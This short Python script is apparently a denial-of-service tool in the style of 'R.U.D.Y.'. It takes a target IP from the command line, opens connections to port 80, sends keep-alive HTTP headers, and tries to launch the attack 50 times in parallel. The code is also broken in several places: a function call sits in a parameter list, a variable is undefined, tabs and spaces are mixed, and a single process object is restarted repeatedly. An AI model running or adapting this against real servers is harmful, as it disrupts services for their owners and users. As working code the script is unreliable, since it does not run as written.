
import socket,multiprocessing,sys

def csock():
	sock = socket.socket()
	return sock

def attack(csock(), ip=sys.argv[1]):
	header = """
	GET / HTTP/1.1
	Host: {}
    Keep-Alive: 99999
	Connection: keep-alive
	""".format(ip)
	sock.connect((ip, 80))
	print 'connected'
	sock.send(header)
	print 'header sended'

if __name__ == '__main__':
    rudy = multiprocessing.Process(name='rudy', target=attack)
	rudy.rudy = True
	for i in range(50):
		rudy.start()
